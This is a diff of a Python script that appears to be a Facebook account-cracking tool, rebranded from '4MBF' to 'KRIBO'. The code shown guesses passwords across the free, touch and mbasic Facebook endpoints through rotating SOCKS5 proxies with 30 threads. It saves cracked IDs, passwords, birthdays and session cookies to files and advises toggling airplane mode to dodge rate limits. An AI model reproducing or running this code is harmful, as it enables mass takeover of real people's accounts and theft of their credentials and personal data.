@@ -382,7 +382,7 @@ def result():
 			cih = 0
 			lol = {}
 			for isi in vin:
-				try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
+				try:hem = open('/sdcard/KRIBO-DATA/CP/'+isi,'r').readlines()
 				except:continue
 				cih+=1
 				if cih<10:
@@ -401,7 +401,7 @@ def result():
 				ric = '# OPTION NOT IN THE MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
-			try:lin = open('/sdcard/4MBF-DATA/CP/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/KRIBO-DATA/CP/'+geh,'r').read().splitlines()
 			except:
 				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
@@ -420,7 +420,7 @@ def result():
 			input('[PRESS ENTER TO RETURN]')
 			back()
 	elif kz in ['2','02']:
-		try:vin = os.listdir('/sdcard/4MBF-DATA/OK')
+		try:vin = os.listdir('/sdcard/KRIBO-DATA/OK')
 		except FileNotFoundError:
 			gada = '# STORAGE NOT FOUND '
 			sol().print(mark(gada, style='red'))
@@ -437,7 +437,7 @@ def result():
 			cih = 0
 			lol = {}
 			for isi in vin:
-				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
+				try:hem = open('/sdcard/KRIBO-DATA/OK/'+isi,'r').readlines()
 				except:continue
 				cih+=1
 				if cih<100:
@@ -456,7 +456,7 @@ def result():
 				ric = '# OPTION NOT IN THE MENU'
 				sol().print(mark(ric, style='red'))
 				exit()
-			try:lin = open('/sdcard/4MBF-DATA/OK/'+geh,'r').read().splitlines()
+			try:lin = open('/sdcard/KRIBO-DATA/OK/'+geh,'r').read().splitlines()
 			except:
 				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 				sol().print(mark(hehe, style='red'))
@@ -492,7 +492,7 @@ def file():
 	sol().print(mark(teks, style='cyan'))
 	my_files = []
 	try:
-		lis = os.listdir('/sdcard/4MBF-DATA/CP')
+		lis = os.listdir('/sdcard/KRIBO-DATA/CP')
 		for kt in lis:
 			my_files.append(kt)
 	except:pass
@@ -504,7 +504,7 @@ def file():
 		cih = 0
 		lol = {}
 		for isi in my_files:
-			try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
+			try:hem = open('/sdcard/KRIBO-DATA/CP/'+isi,'r').readlines()
 			except:
 				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
 				except:continue
@@ -526,13 +526,13 @@ def file():
 			sol().print(mark(ric, style='red'))
 			exit()
 		try:
-			hf = open('/sdcard/4MBF-DATA/CP/'+geh,'r').readlines()
+			hf = open('/sdcard/KRIBO-DATA/CP/'+geh,'r').readlines()
 			for fz in hf:
 				akun.append(fz.replace('\n',''))
 			cek_opsi()
 		except IOError:
 			try:
-				hf = open('/sdcard/4MBF-DATA/OK/'+geh,'r').readlines()
+				hf = open('/sdcard/KRIBO-DATA/OK/'+geh,'r').readlines()
 				for fz in hf:
 					akun.append(fz.replace('\n',''))
 				cek_opsi()
@@ -776,7 +776,7 @@ def pulkanid(linkmem):
 def crack_file():
 	cek = '# CRACK FROM FILE DUMP'
 	sol().print(mark(cek, style='green'))
-	try:vin = os.listdir('/sdcard/4MBF-DATA/DUMP')
+	try:vin = os.listdir('/sdcard/KRIBO-DATA/DUMP')
 	except FileNotFoundError:
 		gada = '# STORAGE NOT FOUND '
 		sol().print(mark(gada, style='red'))
@@ -793,7 +793,7 @@ def crack_file():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('/sdcard/4MBF-DATA/DUMP/'+isi,'r').readlines()
+			try:hem = open('/sdcard/KRIBO-DATA/DUMP/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<10:
@@ -812,7 +812,7 @@ def crack_file():
 			ric = '# OPTION NOT IN THE MENU'
 			sol().print(mark(ric, style='red'))
 			exit()
-		try:lin = open('/sdcard/4MBF-DATA/DUMP/'+geh,'r').read().splitlines()
+		try:lin = open('/sdcard/KRIBO-DATA/DUMP/'+geh,'r').read().splitlines()
 		except:
 			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
 			sol().print(mark(hehe, style='red'))
@@ -911,7 +911,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
 	sol().print(mark(ler, style='green'))
-	krek = '[R] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[R] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
+	krek = '[R] OK RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/OK/%s\n[R] CP RESULTS SAVED IN : INTERNAL MEMORY/KRIBO-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
 	cetak(nel(krek, title=' • CRACK • '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -956,12 +956,12 @@ def crack(idf,pwv,nmf):
 	pers = loop*100/len(id2)
 	fff = '%'
 	ua = random.choice(ugen)
-	ua='Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36'
+	ua='Mozilla/5.0 (Linux; Android 11; 2201116TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36'
 	ua2 = random.choice(ugen2)
 	nip=random.choice(prox)
 	ses=requests.Session()
 	proxs= {'http': 'socks5://'+nip}
-	sys.stdout.write('\r%s KRIBO %s/%s [ OK-🤗:%s - 😔-CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s [KRIBO] %s/%s LBK-OK:%s LBK-CP:%s 🌹 %s%s%s 🌹'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
@@ -987,7 +987,7 @@ def crack(idf,pwv,nmf):
 					print('\n')
 					try:
 						statuscp = f'\r[R] ID       : {idf} \n[R] PASSWORD : {pw} \n[R] NAME : {nmf}\n[R] BIRTHDAY : {ttl}'
-						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
+						open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'|'+ttl+'\n')
 					except:
 						statuscp = f'\r[R] ID       : {idf} \n[R] PASSWORD : {pw} \n[R] NAME : {nmf}'
 						open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -1001,7 +1001,7 @@ def crack(idf,pwv,nmf):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1011,7 +1011,7 @@ def crack(idf,pwv,nmf):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1085,7 +1085,7 @@ def crackfree(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s KRIBO %s/%s [ 🤗-OK:%s - 😔-CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s [KRIBO] %s/%s LBK-OK:%s LBK-CP:%s 🌹 %s%s%s 🌹'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -1104,7 +1104,7 @@ def crackfree(idf,pwv):
 					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='😔-CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1114,7 +1114,7 @@ def crackfree(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1124,7 +1124,7 @@ def crackfree(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1147,7 +1147,7 @@ def crackfree(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]RULL-XYZ LIVE[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1169,7 +1169,7 @@ def cracktouch(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s KRIBO %s/%s [ 🤗-OK:%s - 😔-CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s [KRIBO] %s/%s LBK-OK:%s LBK-CP:%s 🌹 %s%s%s 🌹'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -1188,7 +1188,7 @@ def cracktouch(idf,pwv):
 					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='😔-CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1198,7 +1198,7 @@ def cracktouch(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
@@ -1208,7 +1208,7 @@ def cracktouch(idf,pwv):
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1231,7 +1231,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]RULL-XYZ LIVE[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]🤗-OK[/bold green]'))
 					ok+=1
 					break
 
@@ -1251,7 +1251,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s KRIBO %s/%s [ 🤗-OK:%s - 😔-CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s [KRIBO] %s/%s LBK-OK:%s LBK-CP:%s 🌹 %s%s%s 🌹'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 
@@ -1271,7 +1271,7 @@ def crackmbasic(idf,pwv):
 					statuscp = f'[R] ID       : {idf} [R] PASSWORD : {pw}'
 					statuscp1 = nel(statuscp, style='blue')
 					cetak(nel(statuscp1, title='😔-CP'))
-					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
 				else:continue
@@ -1281,17 +1281,17 @@ def crackmbasic(idf,pwv):
 				if 'no' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					print('\n')
 					statusok = f'[R] ID       : {idf}\n[R] PASSWORD : {pw}\n[R] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='OK'))
+					cetak(nel(statusok1, title='🤗-OK'))
 					ok+=1
 					break
 				elif 'ya' in taplikasi:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+					open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
 					infoakun = ""
 					session = requests.Session()
@@ -1388,18 +1388,18 @@ def cekopsii(id,pw,ttl):
 					print('\n\r')
 					if opsinya=='':
 						try:
-							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
+							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] BIRTHDAY : {ttl}\n[R] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 						except:
-							open('/sdcard/4MBF-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
+							open('/sdcard/KRIBO-DATA/TAP-A2F/'+tpc,'a').write(id+'|'+pw+'\n')
 							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] CHECKPOINT OPTION   : TAP YES / A2F ON (LOGIN MBASIC)'
 					else:
 						try:
 							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] BIRTHDAY : {ttl}\n[R] CHECKPOINT OPTION   :\n {opsinya}'
-							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
+							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'|'+ttl+'\n')
 						except:
 							statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}\n[R] CHECKPOINT OPTION   :\n {opsinya}'
-							open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
+							open('/sdcard/KRIBO-DATA/CP/'+cpc,'a').write(id+'|'+pw+'\n')
 					statusok1 = nel(statusok, style='yellow')
 					cetak(nel(statusok1, title='CHECKPOINT OPTION'))
 				except:
@@ -1413,7 +1413,7 @@ def cekopsii(id,pw,ttl):
 					statusok = f'\r[R] ID       : {id}\n[R] PASSWORD : {pw}'
 				statusok1 = nel(statusok, style='yellow')
 				cetak(nel(statusok1, title='CHECKPOINT OPTION'))
-				open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
+				open('/sdcard/KRIBO-DATA/OK/'+okc,'a').write(id+'|'+pw+'\n')
 
 			else:
 				print('\n\r')
@@ -1426,10 +1426,10 @@ def cekopsii(id,pw,ttl):
 			sol().print(mark(li, style='red'))
 			exit()
 if __name__=='__main__':
-	try:os.mkdir('/sdcard/4MBF-DATA/OK')
+	try:os.mkdir('/sdcard/KRIBO-DATA/CP')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/CP')
+	try:os.mkdir('/sdcard/KRIBO-DATA/OK')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
+	try:os.mkdir('/sdcard/KRIBO-DATA/DUMP')
 	except:pass
 	login()
